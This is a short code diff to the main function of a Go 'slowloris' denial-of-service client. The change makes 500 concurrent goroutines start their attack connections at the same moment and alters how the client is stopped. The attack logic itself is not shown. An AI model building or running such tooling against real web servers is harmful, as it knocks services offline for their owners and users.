@@ -28,11 +28,17 @@ func main() {
 
 	client.Running = true
 
+	//force all connections to start sending at exact same time
+	start := make(chan struct{})
+
 	for i := 0; i < 500; i++ {
-		go client.Attack("")
+		go client.Attack(&start, "")
 	}
 
-	for client.Running {}
+	close(start)
+
+	for client.Running { client.Stop <- false }
+	client.Stop <- true
 }
 
 func listenForStopSig(client *slowloris.Client) {
